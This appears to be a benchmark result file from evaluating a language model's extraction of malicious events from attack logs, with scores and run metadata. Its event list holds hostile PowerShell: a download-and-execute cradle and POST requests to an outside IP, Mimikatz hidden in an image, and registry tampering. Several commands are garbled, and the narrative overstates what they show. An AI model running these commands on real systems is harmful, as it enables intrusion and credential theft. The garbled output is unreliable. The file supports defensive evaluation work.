@@ -1,0 +1,143 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/a -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/a -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test(hta)-Method 'POST'-UseBasicParsing -ContentType \"application/json\", \"stage\": ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test(hta), Method POST,-UseBasicParsing -ContentType application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST', '-UseBasicParsing -ContentType , application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest , http//124.223.85.207:8082/Test.hta, -Method POST-', Use ', BasicParsing , - ContentType ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .//Invoke-PSImage.ps1;Invoke-PSImage -Script .//Invoke-Mimikatz.ps1 -Out .//evil-kiwi.png -Image .//995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest , http//124.223.85.207:8082/Test.hta, -Method 'POST-' Use  BasicParsing -ContentType  \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest , http//124.223.85.207:8082/T1218.005.hta, -Method POST '-', User  Parsing -ContentType  \"application,,json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Get-Service > $env:TEMP\\T1119_1.txt Get-ChildItem Env: > $env:TEMP\\T1119_2.txt Get-Process > $env:TEMP\\T1119_3.txt\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process $env:TEMP\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \u2018HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \u2018 /v \u2018verifierdlls\u2018 /d \u20181\u2018 /f\u201d, ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \u2018HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \u2018 /v verifierdlls /f\u201c, ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \u201cinvoker atomic test T1548.002 \u2013testnumbers 1\u201d\u201d, ",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attackers gained initial access through PowerShell scripts downloaded from an external server. They established persistence using multiple techniques including creating scheduled tasks, modifying registry keys, and creating script files in commonly used directories. The attackers also escalated privileges using various methods such as bypassing UAC, disabling secure boot, and exploiting vulnerabilities in Windows components. Additionally, they executed commands on the victim\u2019s machine to collect information, steal confidential data, and gain further control over the system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44020,
+      "completion_tokens": 1377,
+      "total_tokens": 45397,
+      "wall_clock_s": 26.785,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.391304347826087,
+      "recall": 0.47368421052631576,
+      "f1": 0.42857142857142855,
+      "tp": 9,
+      "fp": 14,
+      "fn": 10
+    },
+    "stage": {
+      "precision": 0.21739130434782608,
+      "recall": 0.2777777777777778,
+      "f1": 0.24390243902439024,
+      "tp": 5,
+      "fp": 18,
+      "fn": 13,
+      "recall_partial": 0.17857142857142858
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44020,
+      "completion_tokens": 1377,
+      "total_tokens": 45397,
+      "wall_clock_s": 26.785,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
